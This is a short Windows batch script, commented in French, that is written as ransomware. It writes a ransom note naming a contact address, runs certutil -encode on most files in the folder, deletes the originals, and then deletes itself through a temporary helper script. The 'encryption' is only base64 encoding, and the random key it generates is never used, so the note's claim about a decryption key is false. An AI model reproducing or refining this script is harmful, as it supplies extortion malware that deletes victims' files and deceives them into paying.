@echo off
setlocal

rem Générer une clé de déchiffrement aléatoire
set "key=%RANDOM%%RANDOM%%RANDOM%"

rem Créer le fichier note.txt avec un message
echo Attention : Tous les fichiers de ce dossier ont été chiffrés > note.txt
echo. >> note.txt
echo Pour obtenir le fichier de décryptage, veuillez contacter hackahmed@hackahmed.com >> note.txt

rem Chiffrer les fichiers
for %%f in (*.*) do (
    if /I "%%~xf" neq ".bat" if /I "%%~xf" neq ".txt" (
        certutil -encode "%%f" "%%f.enc"
        echo Fichier %%f chiffré en %%f.enc
        del "%%f"
    )
)

echo Chiffrement terminé. Note sauvegardée dans note.txt.
pause

rem Création d'un script temporaire pour l'auto-suppression
(
echo @echo off
echo ping 127.0.0.1 -n 3 ^> nul
echo del "HARansom.bat"
echo del "%%~f0"
) > delete_me.bat

rem Lancement du script de suppression et fermeture
start /b cmd /c delete_me.bat
exit
